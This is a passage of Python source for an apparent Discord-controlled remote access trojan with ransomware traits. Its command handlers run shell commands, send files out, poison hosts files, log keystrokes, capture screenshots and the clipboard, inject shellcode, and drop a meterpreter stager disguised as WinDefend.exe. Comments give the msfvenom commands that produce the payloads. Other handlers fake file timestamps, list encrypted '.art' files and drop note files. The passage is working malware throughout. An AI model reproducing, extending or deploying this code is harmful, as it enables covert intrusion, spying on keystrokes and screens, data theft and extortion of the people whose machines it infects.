                output = result.stdout.strip() + ("\n" + result.stderr.strip() if result.stderr.strip() else "")
                if not output:
                    output = "[Command executed with no output]"
                if len(output) > 1900:
                    out_file = os.path.join(self.current_dir, "shell_output.txt")
                    with open(out_file, "w", encoding="utf-8") as f:
                        f.write(output)
                    await message.channel.send("📄 Output too large, attached as file:", file=discord.File(out_file))
                    await self.global_logs_channel.send(f"[shell] {self.hostname}: Output too large, sent as file.")
                    try:
                        os.remove(out_file)
                    except Exception:
                        pass
                else:
                    await message.channel.send(f"```\n{output}\n```")
                    await self.global_logs_channel.send(f"[shell] {self.hostname}: {shell_cmd}\n{output}")
            except Exception as e:
                await message.channel.send(f"❌ Shell execution error: {e}")
                await self.global_logs_channel.send(f"[shell] {self.hostname}: Shell execution error: {e}")
            return
        # !message command (show message box)
        if cmd.startswith("!message"):
            msg = content[8:].strip()
            if not msg:
                await message.channel.send("❌ Usage: !message <text>")
                return
            try:
                import platform
                if platform.system() == "Windows":
                    import ctypes
                    await asyncio.to_thread(ctypes.windll.user32.MessageBoxW, 0, msg, "Message from Admin", 0)
                elif platform.system() == "Darwin":
                    subprocess.run(
                        ["osascript", "-e", f'display dialog {json.dumps(msg)} with title "Message from Admin"'],
                        check=False,
                    )
                else:
                    subprocess.Popen(
                        ["zenity", "--info", f"--text={msg}", "--title=Message from Admin"],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                    )
                await message.channel.send("✅ Message box displayed.")
            except Exception as e:
                await message.channel.send(f"❌ Could not display message box: {e}")
            return
        # !delete command
        if cmd.startswith("!delete"):
            path = strip_outer_quotes(content[7:].strip())
            if not path:
                await message.channel.send("❌ Usage: !delete <path to file>")
                return
            try:
                os.remove(path)
                await message.channel.send(f"✅ File deleted: `{path}`")
                await self.global_logs_channel.send(f"[delete] {self.hostname}: Deleted `{path}`")
            except Exception as e:
                await message.channel.send(f"❌ Delete error: {e}")
                await self.global_logs_channel.send(f"[delete] {self.hostname}: Delete error: {e}")
            return
        # !ls command
        if cmd.startswith("!ls"):
            path = strip_outer_quotes(content[3:].strip()) or self.current_dir
            try:
                files = os.listdir(path)
                listing = "\n".join(files)
                msg = f"**Directory listing for `{path}`:**\n```\n{listing}\n```"
                if len(msg) > 1900:
                    out_file = os.path.join(self.current_dir, "ls_output.txt")
                    with open(out_file, "w", encoding="utf-8") as file_handle:
                        file_handle.write(listing)
                    await message.channel.send(f"📄 Directory listing for `{path}` is too large, attached as file:", file=discord.File(out_file))
                    await self.global_logs_channel.send(f"[ls] {self.hostname}: Output too large for `{path}`, sent as file.")
                    try:
                        os.remove(out_file)
                    except Exception:
                        pass
                else:
                    await message.channel.send(msg)
                    await self.global_logs_channel.send(f"[ls] {self.hostname}: {msg}")
            except Exception as e:
                await message.channel.send(f"❌ ls error: {e}")
                await self.global_logs_channel.send(f"[ls] {self.hostname}: ❌ ls error: {e}")
            return
        # !cd command
        if cmd.startswith("!cd"):
            path = strip_outer_quotes(content[3:].strip())
            if not path:
                await message.channel.send(f"Current directory: `{self.current_dir}`")
                await self.global_logs_channel.send(f"[cd] {self.hostname}: Current directory: `{self.current_dir}`")
                return
            try:
                os.chdir(path)
                self.current_dir = os.getcwd()
                await message.channel.send(f"✅ Changed directory to `{self.current_dir}`")
                await self.global_logs_channel.send(f"[cd] {self.hostname}: Changed directory to `{self.current_dir}`")
            except Exception as e:
                await message.channel.send(f"❌ cd error: {e}")
                await self.global_logs_channel.send(f"[cd] {self.hostname}: ❌ cd error: {e}")
            return
        # !download command
        if cmd.startswith("!download"):
            path = strip_outer_quotes(content[9:].strip())
            if not path:
                await message.channel.send("❌ Usage: !download [path]")
                await self.global_logs_channel.send(f"[download] {self.hostname}: Usage error")
                return
            if not os.path.isfile(path):
                await message.channel.send(f"❌ File not found: `{path}`")
                await self.global_logs_channel.send(f"[download] {self.hostname}: File not found: `{path}`")
                return
            try:
                await message.channel.send(f"📥 Downloading `{path}`:", file=discord.File(path))
                await self.global_logs_channel.send(f"[download] {self.hostname}: Downloaded `{path}`")
                await self.intel_channel.send(f"[download] {self.hostname}: {path}", file=discord.File(path))
            except Exception as e:
                await message.channel.send(f"❌ Download error: {e}")
                await self.global_logs_channel.send(f"[download] {self.hostname}: Download error: {e}")
            return

        # !exfil command — send a specific file back as a Discord attachment
        if cmd.startswith("!exfil "):
            path = strip_outer_quotes(content[7:].strip())
            if not path:
                await message.channel.send("❌ Usage: `!exfil <file_path>`")
                return
            if not os.path.isfile(path):
                await message.channel.send(f"❌ File not found: `{path}`")
                return
            try:
                size = os.path.getsize(path)
                await message.channel.send(
                    f"📤 Exfiltrating `{os.path.basename(path)}` ({size:,} bytes):",
                    file=discord.File(path)
                )
                await self.global_logs_channel.send(f"[exfil] {self.hostname}: sent `{path}` ({size:,} bytes)")
                await self.intel_channel.send(f"[exfil] {self.hostname}: {path}", file=discord.File(path))
            except discord.HTTPException:
                await message.channel.send("❌ File too large for Discord (max 25 MB). Use `!zip` first.")
            except Exception as e:
                await message.channel.send(f"❌ Exfil error: {e}")
            return

        # !files command — list .art encrypted files under a path
        if cmd.startswith("!files"):
            art_path = strip_outer_quotes(content[6:].strip()) if len(content) > 6 else "."
            if not art_path:
                art_path = "."
            if not os.path.isdir(art_path):
                await message.channel.send(f"❌ Directory not found: `{art_path}`")
                return
            entries = []
            total_size = 0
            for root, _dirs, files in os.walk(art_path):
                for fname in files:
                    if fname.endswith(".art"):
                        fpath = os.path.join(root, fname)
                        try:
                            sz = os.path.getsize(fpath)
                            total_size += sz
                            entries.append(f"{fpath}  ({sz:,} B)")
                        except Exception:
                            entries.append(f"{fpath}  (? B)")
            if not entries:
                await message.channel.send(f"ℹ️ No `.art` files found under `{art_path}`.")
                return
            listing = "\n".join(entries[:50])
            suffix = f"\n...and {len(entries)-50} more" if len(entries) > 50 else ""
            await message.channel.send(
                f"🗂️ {len(entries)} encrypted file(s) under `{art_path}` — {total_size:,} bytes total:\n"
                f"```\n{listing}{suffix}\n```"
            )
            return

        # !note command — drop a plaintext note file into a folder
        if cmd.startswith("!note "):
            parts = content.split(None, 2)
            if len(parts) < 3:
                await message.channel.send("❌ Usage: `!note <directory_path> <message text>`")
                return
            note_dir = strip_outer_quotes(parts[1])
            note_text = parts[2]
            if not os.path.isdir(note_dir):
                await message.channel.send(f"❌ Directory not found: `{note_dir}`")
                return
            note_path = os.path.join(note_dir, "README.txt")
            try:
                with open(note_path, "w", encoding="utf-8") as fh:
                    fh.write(note_text)
                await message.channel.send(f"📝 Note written to `{note_path}`.")
                await self.global_logs_channel.send(f"[note] {self.hostname}: note written to {note_path}")
            except Exception as e:
                await message.channel.send(f"❌ Note error: {e}")
            return

        # !upload command with --zip and --b64 support
        if cmd.startswith("!upload "):
            import base64
            import zipfile
            arg = content[8:].strip()
            parts = [part.strip('"') for part in shlex.split(arg, posix=False)]
            if not parts:
                await message.channel.send("❌ Usage: !upload [--zip|--b64] <filename or url> [destination_path]")
                return
            flag = None
            if parts[0] in ("--zip", "--b64"):
                flag = parts[0]
                parts = parts[1:]
            if not parts:
                await message.channel.send("❌ Usage: !upload [--zip|--b64] <filename or url> [destination_path]")
                return
            src = parts[0]
            dest_path = parts[1] if len(parts) > 1 else None
            if not dest_path:
                downloads_dir = os.path.join(os.path.expanduser("~"), "Downloads")
                if not os.path.isdir(downloads_dir):
                    try:
                        os.makedirs(downloads_dir, exist_ok=True)
                    except Exception:
                        downloads_dir = self.current_dir
                dest_path = downloads_dir
            def resolve_output_path(target_path, source_name):
                explicit_dir = target_path.endswith((os.sep, "/")) or (os.altsep and target_path.endswith(os.altsep))
                if os.path.isabs(target_path):
                    return os.path.join(target_path, source_name) if explicit_dir or os.path.isdir(target_path) else target_path
                abs_dest = os.path.join(self.current_dir, target_path)
                return os.path.join(abs_dest, source_name) if explicit_dir or os.path.isdir(abs_dest) else abs_dest

            def ensure_parent_dir(file_path):
                parent_dir = os.path.dirname(file_path)
                if parent_dir:
                    os.makedirs(parent_dir, exist_ok=True)

            def decoded_output_name(source_name):
                if source_name.lower().endswith(".b64"):
                    return source_name[:-4]
                if source_name.lower().endswith(".base64"):
                    return source_name[:-7]
                return source_name + ".decoded"

            # Download from URL
            if re.match(r"https?://", src):
                url_parts = urlsplit(src)
                filename = os.path.basename(unquote(url_parts.path)) or "downloaded_payload.bin"
                filepath = resolve_output_path(dest_path, filename)
                try:
                    import requests
                    r = requests.get(src, allow_redirects=True, timeout=30)
                    r.raise_for_status()
                    ensure_parent_dir(filepath)
                    with open(filepath, "wb") as f:
                        f.write(r.content)
                    if flag == "--zip":
                        with zipfile.ZipFile(filepath, "r") as zipf:
                            zipf.extractall(os.path.dirname(filepath))
                        os.remove(filepath)
                        await message.channel.send(f"✅ File `{filename}` downloaded from {src} and extracted to `{os.path.dirname(filepath)}`")
                        await self.global_logs_channel.send(f"[upload] {self.hostname}: Downloaded `{filename}` from {src} and extracted to `{os.path.dirname(filepath)}`")
                    elif flag == "--b64":
                        decoded_path = os.path.join(os.path.dirname(filepath), decoded_output_name(filename))
                        with open(filepath, "rb") as f_in, open(decoded_path, "wb") as f_out:
                            base64.decode(f_in, f_out)
                        os.remove(filepath)
                        await message.channel.send(f"✅ File `{filename}` downloaded from {src} and decoded to `{decoded_path}`")
                        await self.global_logs_channel.send(f"[upload] {self.hostname}: Downloaded `{filename}` from {src} and decoded to `{decoded_path}`")
                    else:
                        await message.channel.send(f"✅ File `{filename}` downloaded from {src} to `{filepath}`")
                        await self.global_logs_channel.send(f"[upload] {self.hostname}: Downloaded `{filename}` from {src} to `{filepath}`")
                except Exception as e:
                    await message.channel.send(f"❌ Upload failed: {e}")
                    await self.global_logs_channel.send(f"[upload] {self.hostname}: Upload failed: {e}")
                return
            filename = src
            filepath = resolve_output_path(dest_path, filename)
            try:
                ensure_parent_dir(filepath)
                found = False
                async for msg in self.payload_channel.history(limit=100):
                    for att in msg.attachments:
                        if att.filename == filename:
                            await att.save(filepath)
                            found = True
                            break
                    if found:
                        break
                if not found:
                    await message.channel.send(f"❌ File `{filename}` not found in #payloads.")
                    await self.global_logs_channel.send(f"[upload] {self.hostname}: `{filename}` not found in #payloads.")
                    return
                # Decompress or decode if needed
                if flag == "--zip":
                    try:
                        with zipfile.ZipFile(filepath, "r") as zipf:
                            zipf.extractall(os.path.dirname(filepath))
                        await message.channel.send(f"✅ File `{filename}` retrieved from #payloads and extracted to `{os.path.dirname(filepath)}`.")
                        await self.global_logs_channel.send(f"[upload] {self.hostname}: Retrieved `{filename}` from #payloads and extracted to `{os.path.dirname(filepath)}`.")
                        os.remove(filepath)
                    except Exception as e:
                        await message.channel.send(f"❌ Zip extraction failed: {e}")
                        await self.global_logs_channel.send(f"[upload] {self.hostname}: Zip extraction failed: {e}")
                elif flag == "--b64":
                    try:
                        decoded_path = os.path.join(os.path.dirname(filepath), decoded_output_name(filename))
                        with open(filepath, "rb") as f_in, open(decoded_path, "wb") as f_out:
                            base64.decode(f_in, f_out)
                        await message.channel.send(f"✅ File `{filename}` retrieved from #payloads and decoded to `{decoded_path}`.")
                        await self.global_logs_channel.send(f"[upload] {self.hostname}: Retrieved `{filename}` from #payloads and decoded to `{decoded_path}`.")
                        os.remove(filepath)
                    except Exception as e:
                        await message.channel.send(f"❌ Base64 decode failed: {e}")
                        await self.global_logs_channel.send(f"[upload] {self.hostname}: Base64 decode failed: {e}")
                else:
                    await message.channel.send(f"✅ File `{filename}` retrieved from #payloads to `{filepath}`.")
                    await self.global_logs_channel.send(f"[upload] {self.hostname}: Retrieved `{filename}` from #payloads to `{filepath}`.")
            except Exception as e:
                await message.channel.send(f"❌ Upload failed: {e}")
                await self.global_logs_channel.send(f"[upload] {self.hostname}: Upload failed: {e}")
            return
        # !pharm command (hosts file DNS poisoning)
        if cmd.startswith("!pharm"):
            import platform
            PHARM_MARKER = "# [pharm]"
            hosts_path = (
                r"C:\Windows\System32\drivers\etc\hosts"
                if platform.system() == "Windows"
                else "/etc/hosts"
            )
            args = content.split()
            subcmd = args[1].lower() if len(args) > 1 else None

            def read_hosts():
                with open(hosts_path, "r", encoding="utf-8", errors="replace") as f:
                    return f.readlines()

            def write_hosts(lines):
                with open(hosts_path, "w", encoding="utf-8") as f:
                    f.writelines(lines)

            try:
                if subcmd == "add":
                    if len(args) < 4:
                        await message.channel.send("❌ Usage: `!pharm add <domain> <ip>`")
                        return
                    domain, ip = args[2], args[3]
                    lines = read_hosts()
                    # Remove any existing pharm entry for this domain first
                    lines = [l for l in lines if not (PHARM_MARKER in l and domain in l)]
                    lines.append(f"{ip} {domain} {PHARM_MARKER}\n")
                    write_hosts(lines)
                    await message.channel.send(f"✅ Pharm entry added: `{ip}` → `{domain}`")
                    await self.global_logs_channel.send(f"[pharm] {self.hostname}: Added redirect {domain} → {ip}")

                elif subcmd == "remove":
                    if len(args) < 3:
                        await message.channel.send("❌ Usage: `!pharm remove <domain>`")
                        return
                    domain = args[2]
                    lines = read_hosts()
                    new_lines = [l for l in lines if not (PHARM_MARKER in l and domain in l)]
                    if len(new_lines) == len(lines):
                        await message.channel.send(f"⚠️ No pharm entry found for `{domain}`.")
                        return
                    write_hosts(new_lines)
                    await message.channel.send(f"✅ Pharm entry removed for `{domain}`.")
                    await self.global_logs_channel.send(f"[pharm] {self.hostname}: Removed redirect for {domain}")

                elif subcmd == "list":
                    lines = read_hosts()
                    pharm_lines = [l.strip() for l in lines if PHARM_MARKER in l]
                    if not pharm_lines:
                        await message.channel.send("ℹ️ No active pharm redirects.")
                    else:
                        listing = "\n".join(pharm_lines)
                        await message.channel.send(f"**Active pharm redirects:**\n```\n{listing}\n```")
                    await self.global_logs_channel.send(f"[pharm] {self.hostname}: Listed pharm entries")

                elif subcmd == "show":
                    lines = read_hosts()
                    content_str = "".join(lines)
                    if len(content_str) > 1800:
                        out_file = os.path.join(self.current_dir, "hosts_dump.txt")
                        with open(out_file, "w", encoding="utf-8") as f:
                            f.write(content_str)
                        await message.channel.send("📄 Hosts file too large, attached as file:", file=discord.File(out_file))
                        await self.global_logs_channel.send(f"[pharm] {self.hostname}: Hosts file sent as file")
                        try:
                            os.remove(out_file)
                        except Exception:
                            pass
                    else:
                        await message.channel.send(f"**Hosts file (`{hosts_path}`):**\n```\n{content_str}\n```")
                        await self.global_logs_channel.send(f"[pharm] {self.hostname}: Displayed hosts file")

                elif subcmd == "flush":
                    lines = read_hosts()
                    new_lines = [l for l in lines if PHARM_MARKER not in l]
                    removed = len(lines) - len(new_lines)
                    write_hosts(new_lines)
                    await message.channel.send(f"✅ Flushed {removed} pharm redirect(s) from hosts file.")
                    await self.global_logs_channel.send(f"[pharm] {self.hostname}: Flushed {removed} pharm entries")

                else:
                    await message.channel.send(
                        "❌ Usage: `!pharm add <domain> <ip>` | `!pharm remove <domain>` | `!pharm list` | `!pharm show` | `!pharm flush`"
                    )
            except PermissionError:
                await message.channel.send("❌ Permission denied: run the agent with admin/root privileges to modify the hosts file.")
                await self.global_logs_channel.send(f"[pharm] {self.hostname}: Permission denied modifying hosts file")
            except Exception as e:
                await message.channel.send(f"❌ Pharm error: {e}")
                await self.global_logs_channel.send(f"[pharm] {self.hostname}: Error: {e}")
            return
        # !sysinfo command
        if cmd.startswith("!sysinfo"):
            try:
                import subprocess, platform, json as js, socket
                def _run(c): return subprocess.run(c, capture_output=True, text=True, shell=True).stdout.strip()
                whoami     = _run("whoami")
                hostname   = socket.getfqdn()
                os_ver     = platform.version()
                os_name    = platform.system() + " " + platform.release()
                arch       = platform.machine()
                domain     = _run("wmic computersystem get domain /value").replace("Domain=","").strip()
                uptime     = _run("net statistics workstation | findstr /i statistics")
                local_adm  = _run("net localgroup administrators")
                logged     = _run("query user 2>nul || echo N/A")
                av_out     = _run("wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct get displayname /value 2>nul")
                av         = "\n".join(l.replace("displayName=","").strip() for l in av_out.splitlines() if "displayName=" in l) or "N/A"
                priv       = _run("whoami /priv 2>nul")
                info = (
                    f"**System Info — {hostname}**\n```"
                    f"\nUser     : {whoami}"
                    f"\nHostname : {hostname}"
                    f"\nOS       : {os_name}"
                    f"\nVersion  : {os_ver}"
                    f"\nArch     : {arch}"
                    f"\nDomain   : {domain}"
                    f"\nUptime   : {uptime}"
                    f"\nAV       : {av}"
                    f"\n\n-- Local Admins --\n{local_adm}"
                    f"\n\n-- Logged-on Users --\n{logged}"
                    f"\n\n-- Privileges --\n{priv}"
                    f"\n```"
                )
                chunks = [info[i:i+1900] for i in range(0, len(info), 1900)]
                for chunk in chunks:
                    await message.channel.send(chunk)
                await self.global_logs_channel.send(f"[sysinfo] {self.hostname}: collected")
            except Exception as e:
                await message.channel.send(f"❌ sysinfo error: {e}")
            return

        # !ps command
        if cmd.startswith("!ps"):
            try:
                import subprocess
                out = subprocess.run(
                    ["tasklist", "/FO", "CSV", "/NH"],
                    capture_output=True, text=True
                ).stdout.strip()
                lines = ["Name, PID, Session, Mem"]
                for row in out.splitlines():
                    parts = [p.strip('"') for p in row.split('","')]
                    if len(parts) >= 5:
                        lines.append(f"{parts[0]:<35} {parts[1]:<8} {parts[2]:<12} {parts[4]}")
                output = "\n".join(lines)
                if len(output) > 1850:
                    pf = os.path.join(self.current_dir, "ps_output.txt")
                    with open(pf, "w", encoding="utf-8") as f:
                        f.write(output)
                    await message.channel.send("📄 Process list:", file=discord.File(pf))
                    try: os.remove(pf)
                    except Exception: pass
                else:
                    await message.channel.send(f"```\n{output}\n```")
                await self.global_logs_channel.send(f"[ps] {self.hostname}: listed")
            except Exception as e:
                await message.channel.send(f"❌ ps error: {e}")
            return

        # !whoami command
        if cmd.startswith("!whoami"):
            try:
                import subprocess
                out = subprocess.run(["whoami", "/all"], capture_output=True, text=True).stdout.strip()
                if len(out) > 1850:
                    wf = os.path.join(self.current_dir, "whoami_output.txt")
                    with open(wf, "w", encoding="utf-8") as f:
                        f.write(out)
                    await message.channel.send("📄 whoami /all:", file=discord.File(wf))
                    try: os.remove(wf)
                    except Exception: pass
                else:
                    await message.channel.send(f"```\n{out}\n```")
                await self.global_logs_channel.send(f"[whoami] {self.hostname}")
            except Exception as e:
                await message.channel.send(f"❌ whoami error: {e}")
            return

        # !screenshot command
        if cmd.startswith("!screenshot"):
            try:
                import tempfile
                from PIL import ImageGrab
                img = ImageGrab.grab()
                _fd, ss_path = tempfile.mkstemp(suffix="_screenshot.png")
                os.close(_fd)
                img.save(ss_path, "PNG")
                await message.channel.send("🖥️ Screenshot:", file=discord.File(ss_path))
                await self.global_logs_channel.send(f"[screenshot] {self.hostname}: captured")
                try: os.remove(ss_path)
                except Exception: pass
            except Exception as e:
                await message.channel.send(f"❌ screenshot error: {e}")
            return

        # !clipboard command
        if cmd.startswith("!clipboard"):
            args = content.split(None, 2)
            subcmd_clip = args[1].lower() if len(args) > 1 else "read"
            try:
                import subprocess
                if subcmd_clip == "read":
                    out = subprocess.run(
                        ["powershell", "-NoProfile", "-Command", "Get-Clipboard"],
                        capture_output=True, text=True
                    ).stdout.strip()
                    await message.channel.send(f"📋 Clipboard:\n```\n{out or '[empty]'}\n```")
                    await self.global_logs_channel.send(f"[clipboard] {self.hostname}: read")
                elif subcmd_clip == "write":
                    text = args[2] if len(args) > 2 else ""
                    escaped = text.replace("'", "''")
                    subprocess.run(
                        ["powershell", "-NoProfile", "-Command", f"Set-Clipboard -Value '{escaped}'"],
                        capture_output=True
                    )
                    await message.channel.send(f"✅ Clipboard set to: `{text}`")
                    await self.global_logs_channel.send(f"[clipboard] {self.hostname}: wrote")
                else:
                    await message.channel.send("❌ Usage: `!clipboard read` | `!clipboard write <text>`")
            except Exception as e:
                await message.channel.send(f"❌ clipboard error: {e}")
            return

        # !keylog command
        if cmd.startswith("!keylog"):
            args = content.split()
            subcmd_kl = args[1].lower() if len(args) > 1 else "status"
            try:
                if subcmd_kl == "start":
                    if getattr(self, "_keylog_running", False):
                        await message.channel.send("⚠️ Keylogger already running.")
                        return
                    from pynput import keyboard as _kb
                    self._keylog_buf = []
                    self._keylog_running = True
                    def _on_press(key):
                        if not getattr(self, "_keylog_running", False):
                            return False
                        try:
                            self._keylog_buf.append(key.char or "")
                        except AttributeError:
                            self._keylog_buf.append(f"[{key.name}]")
                    self._keylog_listener = _kb.Listener(on_press=_on_press)
                    self._keylog_listener.start()
                    await message.channel.send("✅ Keylogger started.")
                    await self.global_logs_channel.send(f"[keylog] {self.hostname}: started")
                elif subcmd_kl == "stop":
                    if not getattr(self, "_keylog_running", False):
                        await message.channel.send("⚠️ Keylogger not running.")
                        return
                    self._keylog_running = False
                    if hasattr(self, "_keylog_listener"):
                        self._keylog_listener.stop()
                    await message.channel.send("✅ Keylogger stopped.")
                    await self.global_logs_channel.send(f"[keylog] {self.hostname}: stopped")
                elif subcmd_kl == "dump":
                    buf = getattr(self, "_keylog_buf", [])
                    data = "".join(buf)
                    if not data:
                        await message.channel.send("ℹ️ Keylog buffer is empty.")
                        return
                    kf = os.path.join(self.current_dir, "keylog.txt")
                    with open(kf, "w", encoding="utf-8") as f:
                        f.write(data)
                    await message.channel.send("⌨️ Keylog dump:", file=discord.File(kf))
                    self._keylog_buf = []
                    try: os.remove(kf)
                    except Exception: pass
                    await self.global_logs_channel.send(f"[keylog] {self.hostname}: dumped {len(data)} chars")
                else:
                    status = "running" if getattr(self, "_keylog_running", False) else "stopped"
                    chars  = len(getattr(self, "_keylog_buf", []))
                    await message.channel.send(f"⌨️ Keylogger: **{status}** | {chars} chars buffered")
            except Exception as e:
                await message.channel.send(f"❌ keylog error: {e}")
            return

        # !kill command
        if cmd.startswith("!kill "):
            pid_str = content[6:].strip()
            try:
                import subprocess
                pid = int(pid_str)
                result = subprocess.run(["taskkill", "/PID", str(pid), "/F"], capture_output=True, text=True)
                if result.returncode == 0:
                    await message.channel.send(f"✅ Process {pid} terminated.")
                    await self.global_logs_channel.send(f"[kill] {self.hostname}: killed PID {pid}")
                else:
                    await message.channel.send(f"❌ taskkill failed: {result.stderr.strip()}")
            except ValueError:
                await message.channel.send("❌ Usage: `!kill <PID>`")
            except Exception as e:
                await message.channel.send(f"❌ kill error: {e}")
            return

        # !zip command
        if cmd.startswith("!zip "):
            target = content[5:].strip().strip('"')
            if not target or not os.path.exists(target):
                await message.channel.send("❌ Usage: `!zip <file_or_folder>` — path not found.")
                return
            try:
                import zipfile, tempfile
                _fd, zip_path = tempfile.mkstemp(suffix="_art.zip")
                os.close(_fd)
                with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
                    if os.path.isdir(target):
                        for root, dirs, files in os.walk(target):
                            for file in files:
                                fp = os.path.join(root, file)
                                zf.write(fp, os.path.relpath(fp, os.path.dirname(target)))
                    else:
                        zf.write(target, os.path.basename(target))
                await message.channel.send(f"📦 `{os.path.basename(target)}`:", file=discord.File(zip_path))
                await self.global_logs_channel.send(f"[zip] {self.hostname}: zipped {target}")
                try: os.remove(zip_path)
                except Exception: pass
            except Exception as e:
                await message.channel.send(f"❌ zip error: {e}")
            return

        # !runas command
        if cmd.startswith("!runas "):
            parts = content.split(None, 3)
            if len(parts) < 4:
                await message.channel.send("❌ Usage: `!runas <user> <password> <command>`")
                return
            _, ru_user, ru_pass, ru_cmd = parts
            ru_pass_esc = ru_pass.replace("'", "''")
            try:
                import subprocess
                ps_cmd = (
                    f"$pw = ConvertTo-SecureString '{ru_pass_esc}' -AsPlainText -Force; "
                    f"$cred = New-Object System.Management.Automation.PSCredential('{ru_user}', $pw); "
                    f"Start-Process powershell -Credential $cred -ArgumentList '-NoProfile -Command {ru_cmd}' -Wait -PassThru | Select-Object -ExpandProperty ExitCode"
                )
                out = subprocess.run(["powershell", "-NoProfile", "-Command", ps_cmd],
                                     capture_output=True, text=True, timeout=30)
                result_text = (out.stdout.strip() + "\n" + out.stderr.strip()).strip()
                await message.channel.send(f"```\n{result_text or '[no output]'}\n```")
                await self.global_logs_channel.send(f"[runas] {self.hostname}: ran as {ru_user}")
            except Exception as e:
                await message.channel.send(f"❌ runas error: {e}")
            return

        # !inject — inject raw shellcode into a target process
        # Usage: !inject <pid> <base64_shellcode>
        # Generate shellcode: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=.. LPORT=.. -f raw | base64 -w0
        if cmd.startswith("!inject "):
            parts = content.split(None, 2)
            if len(parts) < 3:
                await message.channel.send("❌ Usage: `!inject <pid> <base64_shellcode>`\n"
                    "Generate with: `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ip> LPORT=<port> -f raw | base64 -w0`")
                return
            _, inj_pid_str, sc_b64 = parts
            try:
                import ctypes, ctypes.wintypes, base64 as _b64
                pid = int(inj_pid_str)
                shellcode = _b64.b64decode(sc_b64)
                size = len(shellcode)

                PAGE_EXECUTE_READWRITE = 0x40
                MEM_COMMIT_RESERVE    = 0x3000
                PROCESS_ALL_ACCESS    = 0x1F0FFF

                kernel32 = ctypes.windll.kernel32
                kernel32.VirtualAllocEx.restype  = ctypes.c_void_p
                kernel32.WriteProcessMemory.argtypes = [
                    ctypes.wintypes.HANDLE, ctypes.c_void_p,
                    ctypes.c_char_p, ctypes.c_size_t,
                    ctypes.POINTER(ctypes.c_size_t)
                ]
                kernel32.CreateRemoteThread.restype = ctypes.wintypes.HANDLE

                h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
                if not h_process:
                    err = kernel32.GetLastError()
                    await message.channel.send(f"❌ OpenProcess PID {pid} failed (error {err}). Check PID and privileges.")
                    return

                addr = kernel32.VirtualAllocEx(h_process, None, size, MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
                if not addr:
                    err = kernel32.GetLastError()
                    kernel32.CloseHandle(h_process)
                    await message.channel.send(f"❌ VirtualAllocEx failed (error {err}).")
                    return

                written = ctypes.c_size_t(0)
                ok = kernel32.WriteProcessMemory(h_process, addr, shellcode, size, ctypes.byref(written))
                if not ok or written.value != size:
                    err = kernel32.GetLastError()
                    kernel32.CloseHandle(h_process)
                    await message.channel.send(f"❌ WriteProcessMemory failed (wrote {written.value}/{size} bytes, error {err}).")
                    return

                h_thread = kernel32.CreateRemoteThread(h_process, None, 0, addr, None, 0, None)
                kernel32.CloseHandle(h_process)
                if h_thread:
                    kernel32.CloseHandle(h_thread)
                    await message.channel.send(
                        f"✅ Shellcode ({size} bytes) injected into PID {pid}.\n"
                        f"Meterpreter should call back to your MSF listener now."
                    )
                    await self.global_logs_channel.send(f"[inject] {self.hostname}: shellcode ({size}B) injected into PID {pid}")
                else:
                    err = kernel32.GetLastError()
                    await message.channel.send(f"❌ CreateRemoteThread failed (error {err}).")
            except ValueError:
                await message.channel.send("❌ PID must be an integer.")
            except Exception as e:
                await message.channel.send(f"❌ inject error: {e}")
            return

        # !stager — drop + run an MSF stager EXE
        # Usage: !stager <url|filename> [dest_path]
        #   url      — http/https URL to fetch from
        #   filename — exact filename uploaded to #payloads channel
        # Generate: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=.. LPORT=.. -f exe -o stage.exe
        if cmd.startswith("!stager "):
            parts = content.split(None, 2)
            if len(parts) < 2:
                await message.channel.send(
                    "❌ Usage: `!stager <url|filename> [dest_path]`\n"
                    "  url      — http/https URL of the stager EXE\n"
                    "  filename — name of a file uploaded to #payloads\n"
                    "Generate: `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ip> LPORT=<port> -f exe -o stage.exe`"
                )
                return
            src = parts[1].strip()
            default_dest = os.path.join(
                os.environ.get("LOCALAPPDATA", os.path.expanduser("~")),
                r"Microsoft\Windows\WinDefend.exe"
            )
            dest = strip_outer_quotes(parts[2]) if len(parts) > 2 else default_dest
            try:
                await message.channel.send(f"⬇️ Fetching stager `{src}` → `{dest}` ...")
                data = await self._fetch_payload(src)
                dest_dir = os.path.dirname(dest)
                if dest_dir:
                    os.makedirs(dest_dir, exist_ok=True)
                with open(dest, "wb") as fh:
                    fh.write(data)
                import subprocess as _sp
                _sp.Popen([dest], creationflags=0x08000008)  # DETACHED_PROCESS | CREATE_NO_WINDOW
                await message.channel.send(
                    f"✅ Stager dropped ({len(data):,} bytes) and launched.\n"
                    f"Meterpreter should call back to your MSF listener now."
                )
                await self.global_logs_channel.send(
                    f"[stager] {self.hostname}: stager `{src}` dropped to {dest} and executed"
                )
            except Exception as e:
                await message.channel.send(f"❌ stager error: {e}")
            return

        # !timestomp command
        if cmd.startswith("!timestomp "):
            parts = content.split(None, 2)
            if len(parts) < 3:
                await message.channel.send("❌ Usage: `!timestomp <source_file> <target_file>`")
                return
            _, ts_src, ts_tgt = parts
            try:
                st = os.stat(ts_src.strip('"'))
                os.utime(ts_tgt.strip('"'), (st.st_atime, st.st_mtime))
                # Also clone Windows creation time via PowerShell
                import subprocess
                ps = (
                    f"$src=(Get-Item '{ts_src}').CreationTime; "
                    f"(Get-Item '{ts_tgt}').CreationTime=$src"
                )
                subprocess.run(["powershell", "-NoProfile", "-Command", ps], capture_output=True)
                await message.channel.send(f"✅ Timestamps cloned from `{ts_src}` onto `{ts_tgt}`.")
                await self.global_logs_channel.send(f"[timestomp] {self.hostname}: {ts_src} → {ts_tgt}")
            except Exception as e:
                await message.channel.send(f"❌ timestomp error: {e}")
            return

        # !selfdestruct command — full OPSEC teardown: persistence + copies + loot + self-delete
        if cmd.startswith("!selfdestruct"):
            import sys, glob as _glob, shutil, subprocess
            await message.channel.send("💣 Self-destruct initiated — removing all persistence, copies, loot, and EXE. Connection will drop.")
            await self.global_logs_channel.send(f"[selfdestruct] {self.hostname}: initiated")
            try:
                exe = os.path.abspath(sys.argv[0])
                appdata = os.environ.get("APPDATA", "")
                localappdata = os.environ.get("LOCALAPPDATA", "")
                copy_targets = [
